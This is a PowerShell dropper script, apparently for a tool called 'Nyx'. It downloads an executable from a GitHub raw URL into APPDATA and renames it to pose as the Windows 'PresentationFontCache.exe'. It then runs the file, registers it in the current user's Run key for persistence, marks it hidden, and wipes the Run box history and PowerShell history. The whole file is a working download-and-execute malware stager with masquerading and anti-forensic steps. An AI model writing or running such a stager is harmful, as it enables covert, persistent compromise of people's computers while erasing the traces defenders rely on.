# Nyx - WNJAP42G

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "WNJAP42G" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/WNJAP42G/WNJAP42G.exe -OutFile "$env:APPDATA\WNJAP42G\WNJAP42G.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\WNJAP42G\WNJAP42G.exe" -NewName "PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\WNJAP42G\PresentationFontCache.exe"

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "WNJAP42G" `
-Value "$env:APPDATA\WNJAP42G\PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\WNJAP42G\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
